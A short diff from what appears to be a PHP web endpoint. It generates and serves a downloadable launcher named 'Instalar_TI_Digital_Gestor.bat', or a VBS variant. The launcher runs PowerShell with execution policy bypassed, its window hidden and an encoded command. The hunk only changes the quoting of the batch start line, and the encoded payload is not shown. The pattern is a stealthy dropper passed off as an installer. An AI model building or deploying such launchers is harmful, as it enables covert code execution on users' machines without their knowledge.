@@ -393,7 +393,7 @@ PS;
         $launch='powershell.exe -NoLogo -NoProfile -NonInteractive -STA -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand '.$encoded;
         $vbs="Option Explicit\r\nDim shell\r\nSet shell=CreateObject(\"WScript.Shell\")\r\nshell.Run \"".$launch."\",0,False\r\n";
         if($requestedMode==='bat'){
-            $bat="@echo off\r\nsetlocal\r\nstart \"\" ".$launch."\r\nexit /b 0\r\n";
+            $bat="@echo off\r\nsetlocal\r\n".'start "" '.$launch."\r\nexit /b 0\r\n";
             header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="Instalar_TI_Digital_Gestor.bat"');header('Content-Length: '.strlen($bat));header('Cache-Control: private, no-store');exit($bat);
         }
         header('Content-Type: application/octet-stream');
